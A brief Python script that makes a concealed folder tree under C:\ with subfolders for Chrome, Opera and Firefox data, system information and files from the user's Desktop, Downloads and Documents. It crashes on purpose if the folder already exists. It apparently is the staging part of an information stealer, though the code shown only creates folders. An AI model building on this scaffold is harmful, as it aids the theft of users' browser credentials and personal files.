import os

def makeFolders():
    if os.path.exists(r'C:\hesoyam8927163'):
        print(0/0)
    else:
        os.makedirs(r'C:\hesoyam8927163\Chrome')
        os.makedirs(r'C:\hesoyam8927163\Opera')
        os.makedirs(r'C:\hesoyam8927163\Firefox')
        os.makedirs(r'C:\hesoyam8927163\SystemInformation')
        os.makedirs(r'C:\hesoyam8927163\Txt\Desktop')
        os.makedirs(r'C:\hesoyam8927163\Txt\Downloads')
        os.makedirs(r'C:\hesoyam8927163\Txt\Documents')